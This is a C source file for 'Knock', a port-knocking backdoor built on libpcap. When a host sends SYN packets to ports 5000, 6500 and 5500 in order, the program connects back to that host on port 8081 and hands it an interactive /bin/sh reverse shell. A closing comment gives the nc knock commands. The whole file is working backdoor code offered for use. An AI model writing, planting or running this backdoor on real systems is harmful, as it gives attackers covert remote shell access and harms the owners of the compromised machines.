/*
 * This file is part of Knock.
 * Copyright (c) David Martinez Oliveira 2016
 *
 * Knock is free software: you can redistribute
 * it and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3
 * of the License, or (at your option) any later version.
 *
 * Knock is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Knock.  If not, see <http://www.gnu.org/licenses/>.
 *
 */


/* 
 * Knock, Knock, Knocking in your own BackDoor! Yeah, Yeah, Ye,Ye, Yeeeh!
 * 
 * Basic implementation of a port knocket with reverse shell
 *
 * Creation: 27 January 2016
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <time.h>



#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <pcap.h>

#define RS_PORT   8081

int            port_list[] = {5000,6500,5500, -1};
int            indx = 0;
struct in_addr ip;

int
reverse_shell (struct in_addr ip)
{
  int                s;
  struct sockaddr_in serv;

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket:");
      return -1;
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(RS_PORT);
  memcpy ((void *) &serv.sin_addr.s_addr, (void *) &ip, 
	  sizeof(struct in_addr));

  if (connect (s, (struct sockaddr *) &serv, sizeof(serv)) < 0) 
    perror("connect:");

  /* Fork and dup */
  pid_t pid ;
  char *name[3] ;

  if ((pid = fork ()) < 0)
    write (2, "Cannot create process\n", 22);
  else
    {
      if (pid) close (s);
      else
	{
	  dup2 (s, 0);
	  dup2 (s, 1);
	  dup2 (s, 2);

	  printf ("ROOR Reverse Shell v 0.1\n");
	  name[0] = "/bin/sh";
	  name[1] = "-i";
	  name[2] = NULL;
	  execv (name[0], name );
	  exit (1);
	}
    }
  return 0;
}

void 
ip_cb (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char *p)
{
  struct ip     *ip_pkt;
  struct tcphdr *tcp_pkt;
  int            port;

  ip_pkt =  (struct ip*) (p + sizeof (struct ether_header));
  tcp_pkt = (struct tcphdr*) (p + sizeof (struct ether_header) + 
			     sizeof(struct ip));

  port = ntohs(tcp_pkt->dest);

  if (port_list[indx] == port)
    {
      indx ++;
      /* Store IP to connect back whenever the door is Open */
      memcpy ((void*)&ip, (void*)&ip_pkt->ip_src, sizeof(struct in_addr));
      printf ("+ [%d] SYNC From : %s:%d\n", 
	      indx, inet_ntoa(ip_pkt->ip_src), port);

      if (port_list[indx] == -1)
	{
	  printf ("Open The door!\n");
	  reverse_shell (ip);
	  indx = 0;
	}


    }
  else 
    {
      // Whenever a a connection comes out of order
      // The knocking sequence is reset
      indx = 0;
    }
}

int
main (int argc, char *argv[])
{
  char               err[PCAP_ERRBUF_SIZE];
  pcap_t*            h;
  struct bpf_program fp;
  bpf_u_int32        maskp;
  bpf_u_int32        netp;
  char *             filter = "tcp[tcpflags] & (tcp-syn) != 0 and "
    "tcp[tcpflags] & (tcp-ack) == 0";

  if (argc != 2)
    {
      fprintf (stderr, "Usage: %s interface \n", argv[0]);
      exit (1);
    }
  
  if ((pcap_lookupnet (argv[1], &netp, &maskp, err)) < 0)
    {
      fprintf (stderr, "pcap:%s\n", err);
      exit (1);
    }
  if ((h = pcap_open_live (argv[1], BUFSIZ, 0, 0, err)) == NULL)
    {
      fprintf (stderr, "pcap:%s\n", err);
      exit (1);

    }

  pcap_compile (h, &fp, filter, 0, netp);
  pcap_setfilter (h, &fp);
  pcap_loop (h, -1, ip_cb, NULL);

  return 0;
}
// nc localhost 5000; nc localhost 6500; nc localhost 5500
